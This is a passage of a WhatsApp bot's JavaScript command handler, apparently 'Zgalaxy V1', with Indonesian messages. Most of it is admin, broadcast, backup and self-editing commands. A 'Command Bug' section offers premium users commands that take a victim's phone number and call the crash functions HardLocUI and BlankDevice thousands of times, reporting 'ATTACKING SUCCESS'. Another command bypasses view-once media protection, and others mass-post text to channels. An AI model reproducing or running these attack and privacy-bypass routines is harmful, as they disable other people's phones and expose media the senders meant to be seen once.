    ReplyButton(`✅ *@${number}* berhasil jadi user premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delpremium':
case 'delprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = Premium.indexOf(number);
    if (index !== -1) {
        Premium.splice(index, 1);
        fs.writeFileSync('./system/Premium.json', JSON.stringify(Premium));
        ReplyButton(`❌ *@${number}* telah dihapus dari daftar premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyButton(`⚠️ *@${number}* tidak terdaftar sebagai premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;
case 'listpremium':
case 'listprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (Premium.length === 0) return ReplyButton("❌ Tidak ada user premium.");
    
    let textList = `*📜 Daftar User Premium:*\n\n`;
    for (let i = 0; i < Premium.length; i++) {
        textList += `${i + 1}. wa.me/${Premium[i]}\n`;
    }

    return ReplyButton(textList);
}
break;
case 'listowner':
case 'listown': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (owner.length === 0) return ReplyButton("❌ Tidak ada data Owner.");

    let textList = `*👑 Daftar Owner 𝐎𝐯𝐞𝐫𝐅𝐥𝐨𝐰𝐗:*\n\n`;
    for (let i = 0; i < owner.length; i++) {
        textList += `${i + 1}. wa.me/${owner[i]}\n`;
    }

    return ReplyButton(textList);
}
break;

case 'addownjs': {
    if (!isCreator && !isOwners) return ReplyButton(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyButton("Nomor tidak valid di WhatsApp!");

    if (!OwnerJS.includes(number)) OwnerJS.push(number);

    fs.writeFileSync('./system/ownjs.json', JSON.stringify(OwnerJS));
    ReplyButton(`✅ Berhasil menambahkan *@${number}* sebagai Owner Jasher`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delownjs': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    OwnerJS.splice(OwnerJS.indexOf(number), 1);

    fs.writeFileSync('./system/ownjs.json', JSON.stringify(OwnerJS));
    ReplyButton(`❌ Owner Jasher *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'listownjs': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (OwnerJS.length === 0) return ReplyButton("❌ Tidak ada data Owner.");

    let textList = `*👑 Daftar Owner Jasher:*\n\n`;
    for (let i = 0; i < OwnerJS.length; i++) {
        textList += `${i + 1}. wa.me/${owner[i]}\n`;
    }

    return ReplyButton(textList);
}
break;

case 'addptjs': {
    if (!isCreator) return ReplyButton(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyButton("Nomor tidak valid di WhatsApp!");

    if (!Owners.includes(number)) Owners.push(number);
    if (!OwnerJS.includes(number)) OwnerJS.push(number);
    
    fs.writeFileSync('./system/owns.json', JSON.stringify(Owners));
    fs.writeFileSync('./system/ownjs.json', JSON.stringify(OwnerJS));

    ReplyButton(`✅ Berhasil menambahkan *@${number}* sebagai Partner Jasher`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delptjs': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    Owners.splice(Owners.indexOf(number), 1);
    OwnerJS.splice(OwnerJS.indexOf(number), 1);

    fs.writeFileSync('./system/owns.json', JSON.stringify(Owners));
    fs.writeFileSync('./system/ownjs', JSON.stringify(OwnerJS));
    ReplyButton(`❌ Partner Jasher *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'listptjs': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (Owners.length === 0) return ReplyButton("❌ Tidak ada data partner jasher.");

    let textList = `*👑 Daftar Partner Jasher:*\n\n`;
    for (let i = 0; i < Owners.length; i++) {
        textList += `${i + 1}. wa.me/${owner[i]}\n`;
    }

    return ReplyButton(textList);
}
break;

case "addidch": {
  if (!isCreator) return m.reply(mess.owner);

  let idChannel;

  if (!text && m.chat.endsWith("@newsletter")) {
    idChannel = m.chat;
    global.channels = loadChannels();

    if (global.channels.includes(idChannel)) {
      return m.reply(`ID Saluran *${idChannel}* sudah terdaftar!`);
    }

    global.channels.push(idChannel);
    saveChannels(global.channels);
    return m.reply(`✅ Berhasil menambahkan ID saluran dari dalam channel:\n*${idChannel}*`);

  } else if (text && text.includes("https://whatsapp.com/channel/")) {
    let channelLink = text.trim();
    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return m.reply("Gagal mengekstrak ID dari link saluran!");

    try {
      let res = await client.newsletterMetadata("invite", channelId);
      if (!res.id) return m.reply("ID saluran tidak valid!");

      global.channels = loadChannels();

      if (global.channels.includes(res.id)) {
        return m.reply(`ID Saluran *${res.id}* sudah terdaftar!`);
      }
      
      global.channels.push(res.id);
      saveChannels(global.channels);

      m.reply(`✅ Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\n📛 Nama Saluran: ${res.name}`);
    } catch (e) {
      console.error(e);
      m.reply("❌ Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }

  } else {
    return m.reply("Harap masukkan link saluran atau ketik langsung dari dalam saluran.");
  }
}
break

case "listidch": {
  if (!isCreator) return m.reply(mess.owner);

  global.channels = loadChannels();

  if (!global.channels.length) {
    return m.reply("📭 Belum ada ID saluran yang tersimpan.");
  }

  let teks = `📋 *Daftar ID Saluran Tersimpan:*\n\n`;

  let nomor = 1;
  for (let id of global.channels) {
    teks += `${nomor++}. ${id}\n`;
  }

  teks += `\nTotal: ${global.channels.length} saluran`;

  return m.reply(teks);
}
break

case "delidch": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("Harap masukkan nomor urut, ID saluran, atau link WhatsApp Channel yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {
            return m.reply("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();
        
        if (channelId.includes('whatsapp.com')) {
            const regex = /whatsapp\.com\/channel\/([A-Za-z0-9]+)/;
            const match = channelId.match(regex);
            
            if (match && match[1]) {
                channelId = match[1] + '@newsletter';
            } else {
                return m.reply("Format link WhatsApp Channel tidak valid! Contoh: https://whatsapp.com/channel/xxxxxx");
            }
        }
        
        if (!channelId.includes('@newsletter')) {
            channelId = channelId + '@newsletter';
        }

        const foundChannel = global.channels.find(id => 
            id === channelId || 
            id.replace('@newsletter', '') === channelId.replace('@newsletter', '')
        );

        if (!foundChannel) {
            return m.reply("ID/Link Saluran tidak ditemukan dalam database!");
        }

        global.channels = global.channels.filter((id) => id !== foundChannel);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${foundChannel}*`);
    }
}
break

case "sync": {
    if (!isCreator) return m.reply(mess.owner);

    try {
        await m.reply('⏳ Sinkronisasi dimulai... Mencari semua channel di mana bot ini adalah admin atau owner...');

        
        const CHUNK_SIZE = 50;
        const DELAY_BETWEEN_CHUNKS = 3000;
        const DELAY_BETWEEN_REQUESTS = 500;
        const SAVE_INTERVAL = 10;
        
        const allSubscribedChannels = await client.newsletterFetchAllParticipating();
        if (!allSubscribedChannels || Object.keys(allSubscribedChannels).length === 0) {
            return m.reply('❌ Bot tidak ditemukan di channel manapun.');
        }
        
        const channelFilePath = './system/savesaluran.json';
        let savedChannels = [];
        
        if (fs.existsSync(channelFilePath)) {
            try {
                const fileData = fs.readFileSync(channelFilePath, 'utf8');
                if (fileData.trim()) {
                    savedChannels = JSON.parse(fileData);
                }
            } catch (error) {
                console.error("Error membaca idchannel.json:", error);
                await m.reply('⚠️ Terjadi kesalahan membaca database, membuat yang baru...');
            }
        }

        const channelJids = Object.keys(allSubscribedChannels);
        const totalChannels = channelJids.length;
        let processedCount = 0;
        let addedCount = 0;
        let alreadyExistsCount = 0;
        let notAdminCount = 0;
        let failedCount = 0;

        await m.reply(`📊 Total channel yang akan diproses: ${totalChannels}\n⏳ Proses mungkin memakan waktu beberapa menit...`);

        try {
            if (fs.existsSync(channelFilePath)) {
                const backupDir = './Tmp';
                if (!fs.existsSync(backupDir)) {
                    fs.mkdirSync(backupDir, { recursive: true });
                }
                const backupPath = `${backupDir}/idchannel.backup-${Date.now()}.json`;
                fs.copyFileSync(channelFilePath, backupPath);
            }
        } catch (error) {
            console.error("Gagal membuat backup:", error);
            await m.reply('⚠️ Gagal membuat backup database, melanjutkan tanpa backup...');
        }

        const saveData = async () => {
            try {
                const tempPath = `${channelFilePath}.tmp`;
                fs.writeFileSync(tempPath, JSON.stringify(savedChannels, null, 2));
                
                if (fs.existsSync(channelFilePath)) {
                    fs.unlinkSync(channelFilePath);
                }
                fs.renameSync(tempPath, channelFilePath);
                
                return true;
            } catch (error) {
                console.error("Gagal menyimpan sementara:", error);
                return false;
            }
        };

        for (let i = 0; i < channelJids.length; i += CHUNK_SIZE) {
            const chunk = channelJids.slice(i, i + CHUNK_SIZE);
            
            for (const jid of chunk) {
                try {
                    const channelInfo = allSubscribedChannels[jid];
                    const userRole = channelInfo.viewer_metadata?.role ? 
                                    channelInfo.viewer_metadata.role.toLowerCase() : '';
                    
                    if (userRole === 'admin' || userRole === 'owner' || userRole === 'superadmin') {
                        if (!savedChannels.includes(jid)) {
                            savedChannels.push(jid);
                            addedCount++;
                            
                            if (addedCount % SAVE_INTERVAL === 0) {
                                await saveData();
                                await new Promise(resolve => setTimeout(resolve, 200));
                            }
                        } else {
                            alreadyExistsCount++;
                        }
                    } else {
                        notAdminCount++;
                    }
                    
                    processedCount++;
                    
                    if (processedCount % 25 === 0) {
                        await m.reply(`📊 Progress: ${processedCount}/${totalChannels} channel diproses...`);
                    }
                    
                    await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_REQUESTS));
                    
                } catch (error) {
                    console.error(`Error memproses channel ${jid}:`, error);
                    failedCount++;
                }
            }
            
            if (i + CHUNK_SIZE < channelJids.length) {
                await m.reply(`⏳ Menunggu ${DELAY_BETWEEN_CHUNKS/1000} detik sebelum melanjutkan...`);
                await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_CHUNKS));
            }
        }

        const saveSuccess = await saveData();
        if (!saveSuccess) {
            return m.reply('❌ Gagal menyimpan database channel. Silakan coba lagi.');
        }

        let report = `✅ *Sinkronisasi Selesai!*

📊 *Statistik:*
- ➕ Channel baru ditambahkan: ${addedCount}
- 🔄 Sudah ada di database: ${alreadyExistsCount}
- 👤 Bukan admin/owner: ${notAdminCount}
- ❌ Gagal diproses: ${failedCount}

Total channel (admin/owner) di database sekarang: *${savedChannels.length}*
Total channel yang diproses: *${processedCount}*`;

        await m.reply(report);

    } catch (err) {
        console.error("Gagal sinkronisasi channel:", err);
        m.reply(`❌ Terjadi kesalahan saat sinkronisasi.\n\n*Error:* ${err.message}`);
    }
}
break

case "jpmch": {
    if (!isCreator && !isOwners && !isOwnerJS) return m.reply(mess.owner);

    const cooldownKey = 'jpmch_global_cooldown';
    global.cooldowns = global.cooldowns || {};
    const now = Date.now();
    const cooldownTime = 600000; // 10 menit
    const sisaWaktu = global.cooldowns[cooldownKey] ? global.cooldowns[cooldownKey] - now : 0;

    if (sisaWaktu > 0) {
        const detik = Math.ceil(sisaWaktu / 1000);
        return m.reply(`⏳ *Fitur dalam cooldown!*\nMohon tunggu *${detik} detik* sebelum bisa digunakan kembali.`);
    }

    if (!text && !m.quoted) return m.reply("❗ Masukkan teks atau reply pesan yang ingin dikirim.");
    const teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();
    if (!global.channels.length) return m.reply("❌ Tidak ada channel terdaftar.");

    m.reply(`*╭─❰ *PROSES PENGIRIMAN BOS* ❱─╮
📦 *Sedang Proses Jpmallch...*
📡 *Target:* ${global.channels.length} saluran
⏳ *Mohon Tunggu Hingga Pengiriman Selesai!*
━━━━━━━━━━━━━━━━━━━━━━━━`);

    global.cooldowns[cooldownKey] = now + cooldownTime;

    for (let id of global.channels) {
        try {
            await client.sendMessage(id, { text: teks }, { quoted: m });
            total++;
        } catch (e) {
            console.log(`[JPM] Gagal kirim ke ${id}:`, e.message);
        }
        // 1000 = 1 detik perch sesuaikan
        await sleep(1000);
    }

    m.reply(`*╭─❰ *PENGIRIMAN TELAH SELESAI* ❱─╮
🎉 *Jpmallch Telah Selesai!*  
💡 *Jumlah Saluran Terkirim:* ${total}  
⏳ *Pastikan Jeda 15 Menit Sebelum Mengirim Lagi!*
━━━━━━━━━━━━━━━━━━━━━━━━`);
}
break

case "jpmchnocd": {
    if (!isCreator && !isOwners) return m.reply(mess.owner);

    if (!text && !m.quoted) return m.reply("Mana teksnya, kata mau jpmch");
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();
    if (global.channels.length === 0) {
        return m.reply(`⚠️ Tidak ada saluran terdaftar untuk *JPM*!`);
    }

    m.reply(`╭─❰ *PROSES PENGIRIMAN BOS* ❱─╮━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
📦 *Sedang Proses Jpmallch...*
📡 *Target:* ${global.channels.length} saluran
⏳ *Mohon Tunggu Hingga Pengiriman Selesai!*
━━━━━━━━━━━━━━━━━━━━━━━━`.trim());

    for (let id of global.channels) {
        try {
            await client.sendMessage(id, { text: teks }, { quoted: m });
            total++;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
        // 1000 = 1 detik perch sesuaikan
        await sleep(1000);
    }

    m.reply(`*╭─❰ *PENGIRIMAN TELAH SELESAI* ❱─╮ 
🎉 *Jpmallch Telah Selesai!*  
💡 *Jumlah Saluran Terkirim:* ${total}  
⏳ *Pastikan Jeda 15 Menit Sebelum Mengirim Lagi!*
━━━━━━━━━━━━━━━━━━━━━━━━`.trim());
}
break

case 'public': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = true;
    ReplyButton(" `𝙎𝙪𝙢𝙢𝙚𝙧 𝙂𝙝𝙤𝙨𝙩` set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = false;
    ReplyButton(" `𝙎𝙪𝙢𝙢𝙚𝙧 𝙂𝙝𝙤𝙨𝙩` set to private mode.");
}
break
case "restart": {
    if (!isCreator) return ReplyButton(mess.owner);

    ReplyButton("Restarting `𝙎𝙪𝙢𝙢𝙚𝙧 𝙂𝙝𝙤𝙨𝙩`.....");

    // Delay 3 detik lalu keluar
    setTimeout(() => {
        process.exit(1);
    }, 3000);
}
break
break
case "clsesi":
case "clearsesi":
case "clearsession": {
  try {
    const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
    const dirsampah = fs.readdirSync("./system/cache").filter(e => e !== "A")

    for (const file of dirsesi) {
      await fs.promises.unlink(`./session/${file}`)
    }

    for (const file of dirsampah) {
      await fs.promises.unlink(`./system/cache/${file}`)
    }

    m.reply(`*Berhasil membersihkan sampah ✅*\n` +
            `*${dirsesi.length}* sampah session\n` +
            `*${dirsampah.length}* sampah file`)
  } catch (err) {
    console.error("Gagal membersihkan sesi:", err)
    m.reply("*Terjadi kesalahan saat membersihkan sesi ❌*")
  }
}
//=================================================//
// Command Main
//=================================================//
break

case "cekidch": case "idch": {
if (!text) return ReplyButton(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return ReplyButton("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return ReplyButton(teks)
}
break
case "reactch": {
 if (!text || !args[0] || !args[1]) 
 return ReplyButton(example("linkch 😐"));
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return ReplyButton("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await client.newsletterMetadata("invite", result) 
 await client.newsletterReactMessage(res.id, serverId, args[1])
 ReplyButton(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {
  if (!m.quoted) return ReplyButton("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return ReplyButton("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return ReplyButton("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await client.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await client.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyButton(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyButton('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyButton('Failed to download media!');
    }

    const uploadImage = require('./system/Data1');
    const uploadFile = require('./system/Data2');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyButton('Failed to upload media!');
    }

    ReplyButton(`${link}`)
}
break
case "joingc": case "join": {
if (!isCreator) return ReplyButton(mess.owner);
if (!q) return ReplyButton(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await client.groupAcceptInvite(result);
ReplyButton(`Berhasil bergabung ke grup ✅`)
}
//=================================================//
// Command Group
//=================================================//

break;
case 'hidetag': case "ht": {
  if (!isCreator) return ReplyButton("Khusus Owner Bot.")
  if (!m.isGroup) return ReplyButton("Khusus Dalam Grup.")

  const groupMetadata = await client.groupMetadata(m.chat);
  const participants = groupMetadata.participants.map(p => p.jid ? p.jid : p.id);

  const messageText = q ? q : 'Zoro Always Stay In Here';

  await client.sendMessage(m.chat, {
    text: messageText,
    contextInfo: {
    mentionedJid: participants
    }
  }, { quoted: null });
}
//=================================================//
// Command Bug
//=================================================//

break
case 'munn-invis': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 8000; i++) {
await HardLocUI(target);
await HardLocUI(target);
await HardLocUI(target);
await HardLocUI(target);  
await BlankDevice(target);
await BlankDevice(target);
await sleep(10000);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'zgalaxy-invis': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 8000; i++) {
await HardLocUI(target);
await HardLocUI(target);
await HardLocUI(target);
await HardLocUI(target);  
await BlankDevice(target);
await BlankDevice(target);
await sleep(10000);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'over-crash': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 8000; i++) {
await HardLocUI(target);
await HardLocUI(target);
await HardLocUI(target);
await HardLocUI(target);  
await BlankDevice(target);
await BlankDevice(target);
await sleep(10000);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣`
  let NoOwn = `6285876670135`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1\nX-WA-BIZ-NAME:[[ 𝘼𝙡𝙬𝙖𝙮𝙨𝙢𝙪𝙣𝙣]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  client.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break
case "tqto":
case "credits": {
let Menu = `┏━━⬣  Thanks To
┃ 🐦‍🔥 𝘼𝙡𝙬𝙖𝙮𝙨𝙈𝙪𝙣𝙣 || Developer
┃ 🕊 𝙁𝙝𝙠𝙧𝙮 || Best Friend
┃ 🕊 𝙍𝙞𝙯𝙯 || Best Friend
┗━━⬣  ⿻  ⌜ 𝙕𝙜𝙖𝙡𝙖𝙭𝙮 𝙑1 ⌟  ⿻
--------------------------------------------------------
`
ReplyButton(Menu)
}
break;


case "backupsc":
case "bck":
case "backup": {
    if (!isCreator) return m.reply("Khusus Owner!");
    try {
        const tmpDir = "./Tmp";
        if (fs.existsSync(tmpDir)) {
            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
            for (let file of files) {
                fs.unlinkSync(`${tmpDir}/${file}`);
            }
        }

        await m.reply("Memproses Backup Script ...");

        const bulanIndo = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
        const tgl = new Date();
        const tanggal = tgl.getDate().toString().padStart(2, '0');
        const bulan = bulanIndo[tgl.getMonth()];
        const tahun = tgl.getFullYear();
        const name = `Backup-${tanggal}-${bulan}-${tahun}`;

        const exclude = ["node_modules", "Auth", "package-lock.json", "session", "yarn.lock", ".npm", ".cache"];
        const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

        if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

        const archiver = require('archiver');
        const output = fs.createWriteStream(`./${name}.zip`);
        const archive = archiver('zip', { zlib: { level: 9 } });

        archive.pipe(output);

        for (let file of filesToZip) {
            const stat = fs.statSync(file);
            if (stat.isDirectory()) {
                archive.directory(file, file);
            } else {
                archive.file(file, { name: file });
            }
        }

        await archive.finalize();

        output.on('close', async () => {
            await client.sendMessage(m.sender, {
                document: fs.readFileSync(`./${name}.zip`),
                fileName: `${name}.zip`,
                mimetype: "application/zip"
            }, { quoted: m });

            fs.unlinkSync(`./${name}.zip`);

            if (m.chat !== m.sender) {
                m.reply("Backup script telah berhasil ✅\nFile dikirim ke dalam Chat Pribadi");
            }
        });

    } catch (err) {
        console.error("Backup Error:", err);
        m.reply("Terjadi kesalahan saat melakukan backup.");
    }
}
break;

case "editcase":
    if (!q) return m.reply('Ups! Formatnya kurang tepat. Contoh: *editcase menu|menuBaru* ⚙️');
    if (!isCreator) return m.reply(mess.owner);

    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());
    if (!oldCaseName || !newCaseName) {
        return m.reply('Format kurang lengkap. Coba gini: *editcase namaLama|namaBaru* ✨');
    }

    const filePath = path.join(__dirname, 'case.js');

    try {
        let fileContent = fs.readFileSync(filePath, 'utf8');

        const regex = new RegExp(`case\\s+['"\`]${oldCaseName}['"\`]\\s*:\\s*`, 'g');

        if (!regex.test(fileContent)) {
            return m.reply(`Case *${oldCaseName}* nggak ditemukan di file ❌`);
        }

        const replaced = fileContent.replace(regex, `case '${newCaseName}':`);
        fs.writeFileSync(filePath, replaced, 'utf8');

        m.reply(`Case *${oldCaseName}* berhasil diubah jadi *${newCaseName}* ✅`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi error saat memproses file. Coba dicek lagi, ya! ⚠️');
    }
    break
    
case "addcase": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text && !m.quoted?.text) {
    return m.reply(`*Contoh penggunaan :*\nketik ${cmd} kode / reply kode\n\nContoh kode case:\ncase "bot": {\n  return reply("Hello!")\n}\nbreak`);
  }

  const tt = m.quoted?.text ? m.quoted.text : text;

  function isValidCaseCode(str) {
    const regex = /^case\s+["'`](.+?)["'`]:\s*\{\s*[\s\S]*?\}\s*break\s*;?$/gm;
    return regex.test(str.trim());
  }

  function addCaseToFile(filePath, caseCode) {
    if (!isValidCaseCode(caseCode)) {
      return m.reply("❌ Format case tidak valid.\n\nContoh benar:\ncase \"bot\": {\n  return reply(\"Hello!\")\n}\nbreak");
    }

    const code = fs.readFileSync(filePath, "utf8");

    const lastDefaultIndex = code.lastIndexOf('default:');
    
    if (lastDefaultIndex === -1) {
      return m.reply("Gagal: tidak ditemukan default handler di file case.js");
    }

    const insertPosition = lastDefaultIndex;

    const newCode =
      code.slice(0, insertPosition) +
      `\n\n  ${caseCode.trim()}\n` +
      code.slice(insertPosition);

    fs.writeFileSync(filePath, newCode, "utf8");
    m.reply("✅ Case baru berhasil ditambahkan!");
  }

  addCaseToFile("./case.js", tt);
}
break

case "delcase": {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Masukkan nama case yang ingin dihapus')
    const fs = require('fs')
    const namaFile = 'case.js'
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err)
            return m.reply('Gagal membaca file')
        }
